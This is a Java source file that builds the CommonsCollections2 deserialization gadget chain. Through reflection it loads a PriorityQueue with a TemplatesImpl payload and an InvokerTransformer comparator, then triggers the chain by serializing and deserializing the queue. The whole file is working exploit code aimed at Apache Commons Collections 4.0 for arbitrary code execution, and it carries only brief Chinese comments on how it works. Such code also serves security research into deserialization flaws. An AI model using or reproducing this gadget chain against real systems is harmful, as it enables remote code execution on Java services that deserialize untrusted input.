package commonscollections;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import templates.TemplatesGenerator;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

import transformer.Invoker;
import static utils.SerAndDe.*;

public class CC2 {
    public static PriorityQueue getPriorityQueue() throws Exception{
        /*
        * 用于CommonsCollections4.0调用transformer
        * 可以做到  x1.transform(x2)    x1,x2都可控
        * */
        PriorityQueue queue=new PriorityQueue();
        //让size=2
        queue.add(3);
        queue.add(4);
        Class queueClass=queue.getClass();
        Field queueField=queueClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(queue,new Object[]{
                //x2
                TemplatesGenerator.getTemplatesImpl()
                ,1});

        Class clazz=queue.getClass();
        Field comparatorField=clazz.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(queue, new TransformingComparator(
                //x1
                (Transformer) Invoker.getInvokerTransformer()
        ));
        return queue;
    }

    public static void main(String[] args) throws Exception{
        deserialize(serialize(getPriorityQueue()));
    }
}
